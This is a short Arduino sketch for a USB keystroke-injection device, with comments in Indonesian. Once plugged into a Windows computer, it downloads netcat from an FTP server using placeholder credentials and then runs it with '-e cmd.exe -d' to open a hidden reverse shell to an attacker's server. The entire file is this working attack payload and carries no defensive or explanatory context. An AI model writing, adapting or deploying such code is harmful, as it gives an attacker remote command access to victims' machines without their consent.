#include <NinjaKeyboard.h>

EthicNinjaKeyboard en;

void setup()
{
  //Inisialisasi program
  en.init(1500);
  //Download netcat windows dari ftp
  en.winFTP("get","user_ftp","pass_ftp","host_ftp", "port_ftp","nc.exe");
  //Jalankan nc untuk back connect ke server
  en.winRUN("nc.exe host_server port_server -e cmd.exe -d");
}

void loop() {
  
}

